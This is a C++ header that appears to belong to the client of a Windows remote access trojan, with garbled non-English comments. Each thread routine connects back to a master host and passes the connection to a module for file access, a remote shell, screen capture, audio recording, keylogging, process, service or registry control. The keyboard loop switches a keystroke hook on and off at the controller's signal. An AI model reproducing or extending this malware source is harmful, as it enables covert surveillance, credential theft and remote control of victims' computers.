#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"

#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "ServerManager.h"
#include "RegManager.h"
#include "..\StrCry.h"
#include "until.h"
#include "install.h"
#include <wininet.h>

extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	//---�����׽�����
	privatra	socketClient;
	//����
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;  //����ͷ���
	//---�����ļ�������  �����Ҳ������ CManager Ҳ����˵�������ݽ��պ�ͻ���� CFileManager::OnReceive
	CFM	manager(&socketClient);
	socketClient.run_event_loop();            //---�ȴ��߳̽���

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	
	CSELM	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	
	CSMR	manager(&socketClient);

	socketClient.run_event_loop();
	return 0;
}

// ����ͷ��ͬһ�̵߳���sendDIB������


DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	CADM	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
	char	strKeyboardOfflineRecord[MAX_PATH] = {0};
	g_bSignalHook = false;

	while (1)
	{
		while (g_bSignalHook == false)Sleep(100);
		CKeyM::StartHook();
		while (g_bSignalHook == true)Sleep(100);
		CKeyM::StopHook();
	}

	return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	
	CKeyM	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

//���̱����ص�����
DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	
	CStmM	manager(&socketClient, COMMAND_SYSTEM);
	
	socketClient.run_event_loop();

	return 0;
}

//�����̻߳ص�����
DWORD WINAPI Loop_WindowManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;

	CStmM	manager(&socketClient, COMMAND_WSLIST);

	socketClient.run_event_loop();

	return 0;
}


// ��������߳�
DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)
{
	//OutputDebugString("DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)");
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;

	CSRMR	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}

// ע������
DWORD WINAPI Loop_RegeditManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;

	CRM	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}



#endif // !defined(AFX_LOOP_H_INCLUDED)
